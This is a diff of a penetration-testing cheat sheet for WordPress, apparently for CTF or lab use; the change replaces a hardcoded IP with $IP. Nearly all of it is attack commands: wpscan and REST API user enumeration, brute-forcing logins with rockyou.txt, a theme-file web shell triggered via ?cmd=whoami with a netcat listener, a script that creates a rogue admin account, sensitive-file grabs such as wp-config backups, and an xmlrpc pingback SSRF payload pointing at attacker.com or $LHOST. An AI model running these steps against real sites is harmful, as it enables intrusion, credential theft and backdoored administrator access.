@@ -1,7 +1,7 @@
 # WordPress Attack Surface
 
 !!! tip "Tip"
-    `wpscan --url http://10.10.10.10 --enumerate u` to enumerate users first, then target those accounts. Check `/wp-json/wp/v2/users` for unauthenticated user enumeration even if wpscan is blocked.
+    `wpscan --url http://$IP --enumerate u` to enumerate users first, then target those accounts. Check `/wp-json/wp/v2/users` for unauthenticated user enumeration even if wpscan is blocked.
 
 !!! warning "Watch out"
     wpscan's plugin/theme detection is noisy and slow. Run `--enumerate p` only after confirming the scan won't trip rate limiting or WAF rules.
@@ -23,13 +23,13 @@ Look for:
 **WhatWeb**:
 
 ```bash
-whatweb http://10.10.10.10
+whatweb http://$IP
 ```
 
 **Unauthenticated REST API user enumeration**:
 
 ```bash
-curl -s http://10.10.10.10/wp-json/wp/v2/users | jq
+curl -s http://$IP/wp-json/wp/v2/users | jq
 ```
 
 Returns usernames (`slug` field) without authentication on most WordPress deployments, faster and quieter than wpscan.
@@ -47,13 +47,13 @@ sudo gem install wpscan
 ### Quick Scan
 
 ```bash
-wpscan --url http://10.10.10.10
+wpscan --url http://$IP
 ```
 
 ### Enumerate Plugins & Versions
 
 ```bash
-wpscan --url http://10.10.10.10 -e vp --api-token $TOKEN -o wpscan.log
+wpscan --url http://$IP -e vp --api-token $TOKEN -o wpscan.log
 ```
 
 - `-e vp` – Enumerate vulnerable plugins
@@ -65,7 +65,7 @@ wpscan --url http://10.10.10.10 -e vp --api-token $TOKEN -o wpscan.log
 ### Full Enumeration
 
 ```bash
-wpscan --url http://10.10.10.10 -e ap,at,cb,dbe,u,m --api-token $TOKEN
+wpscan --url http://$IP -e ap,at,cb,dbe,u,m --api-token $TOKEN
 ```
 
 | Flag | Description |
@@ -84,7 +84,7 @@ wpscan --url http://10.10.10.10 -e ap,at,cb,dbe,u,m --api-token $TOKEN
 ### Brute Force Login
 
 ```bash
-wpscan --url http://10.10.10.10 -U users.txt -P rockyou.txt --api-token $TOKEN
+wpscan --url http://$IP -U users.txt -P rockyou.txt --api-token $TOKEN
 ```
 
 ```bash
@@ -125,7 +125,7 @@ nc -lvnp 4444
 3. Browse to:
 
 ```
-http://10.10.10.10/wp-content/themes/<theme>/404.php?cmd=whoami
+http://$IP/wp-content/themes/<theme>/404.php?cmd=whoami
 ```
 
 ### Create Admin User via Shell
@@ -145,7 +145,7 @@ if (!username_exists($user)) {
 ```
 
 ```
-http://10.10.10.10/wp-content/uploads/admin_create.php
+http://$IP/wp-content/uploads/admin_create.php
 ```
 
 ---
@@ -155,9 +155,9 @@ http://10.10.10.10/wp-content/uploads/admin_create.php
 ### Sensitive File Disclosure
 
 ```bash
-curl http://10.10.10.10/.git/config
-curl http://10.10.10.10/wp-config.php~
-curl http://10.10.10.10/wp-content/debug.log
+curl http://$IP/.git/config
+curl http://$IP/wp-config.php~
+curl http://$IP/wp-content/debug.log
 ```
 
 ### Common Files to Check
@@ -172,14 +172,14 @@ curl http://10.10.10.10/wp-content/debug.log
 Used for brute-force and pingback SSRF:
 
 ```bash
-curl -X POST -d @payload.xml http://10.10.10.10/xmlrpc.php
+curl -X POST -d @payload.xml http://$IP/xmlrpc.php
 ```
 
 ```xml
 <methodCall>
   <methodName>pingback.ping</methodName>
   <params>
-    <param><value><string>http://attacker.com</string></value></param>
+    <param><value><string>http://$LHOST</string></value></param>
     <param><value><string>http://localhost/</string></value></param>
   </params>
 </methodCall>
